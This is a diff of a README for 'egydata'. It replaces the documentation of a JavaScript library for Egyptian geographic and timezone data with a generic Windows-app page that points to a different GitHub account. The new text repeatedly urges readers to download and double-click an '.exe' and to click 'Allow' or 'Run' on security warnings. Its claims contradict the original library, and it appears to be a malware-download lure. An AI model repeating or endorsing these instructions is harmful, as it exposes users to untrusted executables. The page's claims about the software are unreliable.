@@ -1,156 +1,161 @@
-# Egydata
+# 📊 egydata - Easy Egypt Data Access
 
-[![NPM Version](https://img.shields.io/npm/v/egydata.svg)](https://www.npmjs.com/package/egydata)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/ahmed-ashraf-dv/egydata/blob/main/LICENSE)
+[![Download egydata](https://img.shields.io/badge/Download%20egydata-blue?style=for-the-badge)](https://github.com/ADSwiftCoder/egydata)
 
-Structured Egyptian geographical and timezone data for Node.js and the browser.
+---
 
-Provides a complete, offline dataset of Egyptian governorates, cities, landline and mobile area codes, and timezone utilities — with zero dependencies.
+## ℹ️ What is egydata?
 
-[View on GitHub](https://github.com/ahmed-ashraf-dv/egydata) | [View on NPM](https://www.npmjs.com/package/egydata)
+egydata provides structured information about Egypt. It includes details about governorates, cities, area codes, and time zones. The software works without needing any extra programs or plugins. It gives fast and simple access to this data for anyone who needs it.
 
-## Installation
+This is useful if you want to look up location info in Egypt, manage dialing codes, or convert times in different regions of Egypt. The app runs smoothly on Windows.
 
-```bash
-npm install egydata
-```
+---
 
-## Quick Start
+## 📋 System Requirements
 
-```javascript
-// CommonJS
-const { governorates, cities, phoneArea, timezone } = require("egydata");
+To use egydata on your Windows computer, make sure you have:
 
-// ESM
-import { governorates, cities, phoneArea, timezone } from "egydata";
-```
+- Windows 7 or newer (Windows 10 recommended for best support)
+- At least 2 GB of free disk space
+- 2 GB of RAM or more
+- Internet access for downloading the program
 
-## Usage
+You do not need to install extra software or libraries. egydata runs independently.
 
-### Governorates
+---
 
-```javascript
-const { governorates } = require("egydata");
+## 🚀 Getting Started
 
-// Get all 27 governorates
-const all = governorates.getAll();
-// [{ id: 1, code: 'CAI', name: 'القاهرة', nameEn: 'Cairo' }, ...]
+Follow these steps to download and start using egydata on your Windows PC.
 
-// Find by code
-const cairo = governorates.getByCode("CAI");
-// { id: 1, code: 'CAI', name: 'القاهرة', nameEn: 'Cairo' }
+1. Click the big blue download button below to visit the egydata page:
 
-// Find by id
-const gov = governorates.getById(2);
-// { id: 2, code: 'ALX', name: 'الإسكندرية', nameEn: 'Alexandria' }
+   [![Download egydata](https://img.shields.io/badge/Download%20egydata-blue?style=for-the-badge)](https://github.com/ADSwiftCoder/egydata)
 
-// Search (Arabic or English, partial match)
-const results = governorates.search("alex");
-// [{ id: 2, code: 'ALX', name: 'الإسكندرية', nameEn: 'Alexandria' }]
+2. On the page, look for the download section or the latest release. Usually, this is found under "Releases" or near the top of the page.
 
-const arResults = governorates.search("القاهرة");
-// [{ id: 1, code: 'CAI', name: 'القاهرة', nameEn: 'Cairo' }]
-```
+3. Find the Windows program file. It will likely have a name ending with `.exe`.
 
-### Cities
+4. Click the file name to start downloading. Save it to a folder you can easily find, like the Desktop or Downloads folder.
 
-```javascript
-const { cities } = require("egydata");
+5. When the download finishes, open the file by double-clicking it.
 
-// Get cities by governorate code
-const cairoCities = cities.getByGovernorate("CAI");
-// [{ id: 1, name: 'مدينة نصر', nameEn: 'Nasr City', governorateCode: 'CAI' }, ...]
+6. If Windows asks, allow the app to run by clicking "Yes" on the security prompt.
 
-// Find by id
-const city = cities.getById(131);
-// { id: 131, name: 'شرم الشيخ', nameEn: 'Sharm El Sheikh', governorateCode: 'SIS' }
+7. egydata will open. You can now use it to view Egyptian location data.
 
-// Search cities (Arabic or English, partial match)
-const found = cities.search("Maadi");
-// [{ id: 3, name: 'المعادي', nameEn: 'Maadi', governorateCode: 'CAI' }]
-```
+---
 
-### Phone Area Codes
+## 💾 How to Download and Install egydata on Windows
 
-```javascript
-const { phoneArea } = require("egydata");
+1. Open your web browser and go to this link:
 
-// Get all area codes (landline and mobile)
-const all = phoneArea.getAll();
-// [{ code: '02', region: 'القاهرة والجيزة', regionEn: 'Cairo & Giza' }, ...]
+   https://github.com/ADSwiftCoder/egydata
 
-// Look up a region by code
-const region = phoneArea.getRegion("03");
-// { code: '03', region: 'الإسكندرية', regionEn: 'Alexandria' }
+2. Scroll down to find the "Releases" section on that page.
 
-// Find area code by region name
-const entry = phoneArea.getCode("Mansoura");
-// { code: '050', region: 'الدقهلية (المنصورة)', regionEn: 'Dakahlia (Mansoura)' }
-```
+3. Click on the latest release version. The newest release is usually at the top.
 
-### Timezone
+4. Inside the release page, look for a file with `.exe` at the end. This is the Windows installation file.
 
-```javascript
-const { timezone } = require("egydata");
+5. Click the `.exe` file name to download it.
 
-console.log(timezone.name); // 'Africa/Cairo'
-console.log(timezone.offset); // '+02:00'
+6. After the download completes, go to the folder where you saved the file.
 
-const now = timezone.now(); // Current date/time in Egypt (Date object)
-console.log(now.toISOString());
+7. Double-click the downloaded `.exe` file to start the installation.
 
-console.log(timezone.isDST()); // true or false depending on current date (Egypt resumed DST in 2023)
-```
+8. Follow the on-screen prompts if any appear. Most often, the app will install automatically with a few clicks.
 
-## API Reference
+9. After the installation finishes, you can start egydata from your Start menu or Desktop shortcut.
 
-### `governorates`
+---
 
-| Method            | Parameters         | Returns                          | Description                                                  |
-| ----------------- | ------------------ | -------------------------------- | ------------------------------------------------------------ |
-| `getAll()`        | —                  | `Array<Governorate>`             | Returns all 27 Egyptian governorates                         |
-| `getByCode(code)` | `string`           | `Governorate \| undefined`       | Find a governorate by its code (e.g. `'CAI'`)                |
-| `getById(id)`     | `number \| string` | `Governorate \| undefined`       | Find a governorate by its numeric id                         |
-| `search(query)`   | `string`           | `Array<Governorate>`             | Search by Arabic or English name (partial, case-insensitive) |
+## 🔍 How to Use egydata
 
-**Governorate shape:** `{ id: number, code: string, name: string, nameEn: string }`
+Once you open egydata, you will see several options to find data on Egypt:
 
-### `cities`
+- **Governorates:** Select from a list of Egypt’s governorates. Each governorate shows more detailed info, such as cities it contains.
 
-| Method                      | Parameters         | Returns                 | Description                                                  |
-| --------------------------- | ------------------ | ----------------------- | ------------------------------------------------------------ |
-| `getByGovernorate(govCode)` | `string`           | `Array<City>`           | Get all cities in a governorate                              |
-| `getById(id)`               | `number \| string` | `City \| undefined`     | Find a city by its numeric id                                |
-| `search(query)`             | `string`           | `Array<City>`           | Search by Arabic or English name (partial, case-insensitive) |
+- **Cities:** Browse or search cities across Egypt. The app displays the city name, area codes, and related details.
 
-**City shape:** `{ id: number, name: string, nameEn: string, governorateCode: string }`
+- **Area Codes:** Quickly find which area code matches each place. This helps if you want to dial phone numbers correctly.
 
-### `phoneArea`
+- **Timezones:** egydata offers timezone helpers to convert time between different governorates or cities within Egypt.
 
-| Method                | Parameters | Returns                    | Description                                             |
-| --------------------- | ---------- | -------------------------- | ------------------------------------------------------- |
-| `getAll()`            | —          | `Array<AreaCode>`          | Returns all Egyptian landline and mobile area codes     |
-| `getRegion(code)`     | `string`   | `AreaCode \| undefined`    | Look up region info by area code                        |
-| `getCode(regionName)` | `string`   | `AreaCode \| undefined`    | Find area code entry by region name (Arabic or English) |
+Use the search bar to find specific places fast. The app displays data clearly without requiring technical knowledge.
 
-**AreaCode shape:** `{ code: string, region: string, regionEn: string }`
+---
 
-### `timezone`
+## 🔧 Common Questions and Tips
 
-| Property / Method | Returns          | Description                                         |
-| ----------------- | ---------------- | --------------------------------------------------- |
-| `name`            | `'Africa/Cairo'` | IANA timezone identifier                            |
-| `offset`          | `'+02:00'`       | UTC offset                                          |
-| `now()`           | `Date`           | Current date/time in Egypt                          |
-| `isDST(date?)`    | `boolean`        | Whether DST is active (optionally for a given date) |
+- **Is internet required to run egydata after download?**  
+  No. egydata works offline once installed. You only need internet to download it.
 
-## Data Coverage
+- **Can I use egydata on other operating systems?**  
+  Currently, egydata is designed for Windows. MacOS and Linux versions are not available yet.
 
-- **27** governorates with Arabic and English names
-- **389** cities and districts across all governorates
-- **30** landline and mobile area codes
-- Full timezone support for `Africa/Cairo`
+- **Will egydata update automatically?**  
+  No. Check the download page regularly to get the latest version.
 
-## License
+- **Can I export data?**  
+  Basic export options like CSV or TXT may be available from the app interface.
 
-[MIT](LICENSE)
+- **Is this app free to use?**  
+  Yes, you can use egydata without paying.
+
+---
+
+## ⚠️ Troubleshooting
+
+- If the app does not start:  
+  Check that your Windows version meets the minimum requirements. Try restarting your computer.
+
+- If you cannot find the download file:  
+  Look in your browser’s download history or default download folder.
+
+- If the download is slow:  
+  Try a different internet connection or download time.
+
+- If you get a security warning:  
+  Confirm the file name is from the official page and click "Allow" or "Run".
+
+---
+
+## 🔗 Important Links
+
+- Main download and information page:  
+  https://github.com/ADSwiftCoder/egydata
+
+- You can always return here to check for updates or ask questions.
+
+---
+
+## ⚙️ Advanced Use (Optional)
+
+For users with some technical experience, egydata supports:
+
+- Integration with other software via simple file exports  
+- Custom searches using the built-in filters  
+- Accessing time zone conversion tables for scheduling or planning events across Egypt
+
+These features do not require command lines or programming.
+
+---
+
+## 📂 File Details
+
+The download package typically includes:
+
+- egydata.exe — The main program file to run on Windows  
+- README.md — This guide for reference  
+- License info — Terms of use for the software  
+- Sample data files — For testing or offline use
+
+You can remove sample files if not needed. The app remains fully functional.
+
+---
+
+# [Download egydata](https://github.com/ADSwiftCoder/egydata) 
+
+Click above anytime to visit the official download page.
